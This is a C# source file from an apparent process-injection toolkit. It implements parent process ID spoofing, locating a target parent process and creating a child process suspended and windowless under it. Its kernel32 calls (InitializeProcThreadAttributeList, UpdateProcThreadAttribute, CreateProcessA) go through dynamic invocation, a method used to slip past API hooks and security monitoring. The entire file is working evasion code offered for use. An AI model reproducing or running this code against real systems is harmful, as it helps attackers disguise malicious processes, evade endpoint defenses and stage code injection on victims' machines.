using ProcessInjection.DInvoke.Native;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using static ProcessInjection.Utils.Utils;

namespace ProcessInjection.DInvoke
{
    public class DynamicPPIDSpoofing
    {
        // https://stackoverflow.com/questions/10554913/how-to-call-createprocess-with-startupinfoex-from-c-sharp-and-re-parent-the-ch

        public int SearchForPPID(string process)
        {
            int pid = 0;
            int session = Process.GetCurrentProcess().SessionId;
            Process[] allprocess = Process.GetProcessesByName(process);

            try
            {
                foreach (Process proc in allprocess)
                {
                    if (proc.SessionId == session)
                    {
                        pid = proc.Id;
                        PrintInfo($"[!] Parent process ID found: {pid}.");
                    }
                }
            }
            catch (Exception ex)
            {
                PrintError("[-] " + Marshal.GetExceptionCode());
                PrintError(ex.Message);
            }
            return pid;
        }



        public Structs.PROCESS_INFORMATION DynamicParentSpoofing(int parentID, string childPath)
        {
            var pInfo = new Structs.PROCESS_INFORMATION();

            var siEx = new DInvoke.Native.Structs.STARTUPINFOEX();
            siEx.StartupInfo.cb = (uint)Marshal.SizeOf(siEx);
            siEx.StartupInfo.dwFlags = 0x00000001;

            var lpValue = Marshal.AllocHGlobal(IntPtr.Size);

            try
            {
                var funcParams = new object[] {
                    IntPtr.Zero,
                    1,
                    0,
                    IntPtr.Zero
                };

                DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
                    "kernel32.dll",
                    "InitializeProcThreadAttributeList",
                    typeof(DInvoke.Native.Delegates.InitializeProcThreadAttributeList),
                    ref funcParams,
                    true);

                var lpSize = (IntPtr)funcParams[3];
                siEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);

                funcParams[0] = siEx.lpAttributeList;

                DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
                    "kernel32.dll",
                    "InitializeProcThreadAttributeList",
                    typeof(DInvoke.Native.Delegates.InitializeProcThreadAttributeList),
                    ref funcParams,
                    true);

                // PPID Spoof
                PrintInfo($"[+] Obtaining the handle for the process id {parentID}.");
                var hParent = Process.GetProcessById(parentID).Handle;

                PrintInfo($"[!] Handle {hParent} opened for parent process id.");

                lpValue = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(lpValue, hParent);

                // Start Process
                funcParams = new object[]
                {
                    siEx.lpAttributeList,
                    (uint)0,
                    (IntPtr)DInvoke.Native.Enum.ProcThreadAttribute.PARENT_PROCESS,
                    lpValue,
                    (IntPtr)IntPtr.Size,
                    IntPtr.Zero,
                    IntPtr.Zero
                };

                DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
                    "kernel32.dll",
                    "UpdateProcThreadAttribute",
                    typeof(DInvoke.Native.Delegates.UpdateProcThreadAttribute),
                    ref funcParams,
                    true);

                PrintInfo($"[!] Adding attributes to a list.");

                var ps = new DInvoke.Native.Structs.SECURITY_ATTRIBUTES();
                var ts = new DInvoke.Native.Structs.SECURITY_ATTRIBUTES();
                ps.nLength = Marshal.SizeOf(ps);
                ts.nLength = Marshal.SizeOf(ts);

                funcParams = new object[]
                {
                    null,
                    childPath,
                    ps,
                    ts,
                    true,
                    DInvoke.Native.Enum.CreationFlags.CREATE_SUSPENDED | DInvoke.Native.Enum.CreationFlags.EXTENDED_STARTUPINFO_PRESENT | DInvoke.Native.Enum.CreationFlags.CREATE_NO_WINDOW,
                    IntPtr.Zero,
                    "C:\\Windows\\System32",
                    siEx,
                    null
                };

                DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
                    "kernel32.dll",
                    "CreateProcessA",
                    typeof(DInvoke.Native.Delegates.CreateProcess),
                    ref funcParams,
                    true);

                pInfo = (DInvoke.Native.Structs.PROCESS_INFORMATION)funcParams[9];
                PrintInfo($"[!] New process with ID: {pInfo.dwProcessId} created in a suspended state under the defined parent process.");
            }

            catch (Exception ex)
            {
                PrintError("[-] " + Marshal.GetExceptionCode());
                PrintError(ex.Message);
            }

            return pInfo;

        }
    }
}
